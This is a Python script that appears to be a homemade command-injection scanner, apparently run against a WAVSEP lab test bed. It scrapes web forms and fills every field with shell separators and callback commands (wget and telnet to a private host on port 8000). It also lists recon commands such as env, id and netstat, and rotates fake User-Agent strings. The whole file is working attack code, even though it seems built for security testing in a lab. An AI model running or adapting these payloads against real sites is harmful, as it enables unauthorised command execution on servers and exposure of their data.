# -*- coding: utf-8 -*-

import mechanize
import requests
import random
import base64
import sqlite3
import sys
from urlparse import urlparse 
from urlparse import urljoin 
from urlparse import urlunsplit 


user_agents = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36", \
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2", \
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", \
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)"
                ]


def make_parameters(url):
    
    br = mechanize.Browser()
    br.open(url)
    method = ""
    action = ""
    result = []
     
    forms = [f for f in br.forms()]
    
    if forms == []:
        return False
    
    for form in forms:
        try:
            method = form.method
        except:
            method = "GET"
        
        try:
            action = form.action
        except:
            pass
        
        payloads = {}
        method = form.method
        action = form.action
        
        value_number = len(form.controls)
    
        for value in range(value_number):
            try:
                name = str(form.controls[value].name)
            except:
                name = ""
            try:
                value = str(form.controls[value].value)
            except:
                value = ""        
            
            payloads[name] = value
        result.append([payloads, method, action])
    return result
        
def web_request(payloads, method, action):
    
    if method == "GET":
        attack_strings = ""
        for name in payloads.keys():
            attack_strings += name
            attack_strings += "="
            attack_strings += payloads[name]
            attack_strings += "&"
        payload = action + "?" +attack_strings
        
        res = requests.get(payload, timeout = 1, \
                           headers = {"User-Agent" : random.choice(user_agents)},\
                           )
#         print res.content, res.status_code
    
    else:
        res = requests.post(action, timeout = 1, \
                           headers = {"User-Agent" : random.choice(user_agents)},\
                           data = payloads
                           )
#         print res.content, res.status_code


def remote_code_execution_attack(payloads, method, action):
        
    attack_escape_strings = ["&&", ";", "|", "||"]
    attack_commands = ["wget 192.168.10.8:8000/",\
                       "echo \"GET /jongwon HTTP/1.1\" | telnet 192.168.10.8 8000;"]
    
    attack_commands_passive = ["uname -a", "env", "id", "netstat -an"]
#     attack_commands = ["uname -a", "env", "id", "telnet 192.168.10.8 8000\\r\\nGET /jongwon HTTP/1.1\\r\\nabcd"]
# make reg_exp for above commands

    for name in payloads.keys():
        for attack_escape_string in attack_escape_strings:
            for attack_command in attack_commands:         
                payloads[name] = attack_escape_string
                payloads[name] += attack_command
                payloads[name] += action # vulnerable url
                payloads[name] += base64.b64encode(str(payloads)) # vulnerable parameter
                content = web_request(payloads, method, action)
                print action
    
def main():

    global conn
    conn = sqlite3.connect("crawler.db")
    
    global cur
    cur = conn.cursor()

    cur.execute("select id, url from wavsep where id < '100' and id > '55' ")

    for row in cur:
        
        id = row[0]
        url = row[1]
        
        # if payloads is in url
        if urlparse(url)[4]:
            payloads = urlparse(url)[4]
            remote_code_execution_attack(payloads, "GET", url)
        
        results = make_parameters(url)

        # if there is no form, it return False 
        if results:
            for result in results:
                
                # none attr is submit
                payloads = result[0]
                del payloads["None"]

                method = result[1]
                action = result[2]
        
                remote_code_execution_attack(payloads, method, action)
                
    cur.close()
    sys.exit()
    
 

#     results = make_parameters("http://192.168.10.9/index.php")

#     for result in results:
#         payloads = result[0]
#         method = result[1]
#         action = result[2]
#         security_test(payloads, method, action)
        
        
    
if __name__ == "__main__":
    main()
#     print make_parameters("http://www.daum.net")
        
#     print form.controls[0].attrs
#     if "name" in form.controls[0].attrs:
#         print 1
#     print form.controls[0].name
#     print form.controls[0].value

    
    
# print forms[0]
# print
# print forms[0].controls[0]
# 
# print len(forms[0].controls)
# print forms[0].controls[0].name
# print forms[0].controls[1].name
# print forms[0].attrs
# print forms[0].method
# print forms[0].controls[0].attrs
# print forms[0].controls[0].attrs["value"]
# print len(forms[0].controls)
# 
# print forms[0].controls[1].attrs
# print forms[0].controls[2].attrs
# print forms[0].controls[3].attrs
# print forms[0].controls[4].attrs







# br.set_handle_robots(False)
# br.select_form(nr=0)
# br.form['host'] = "192.168.10.1;env"
# res = br.submit()
# content = res.read()
# print content
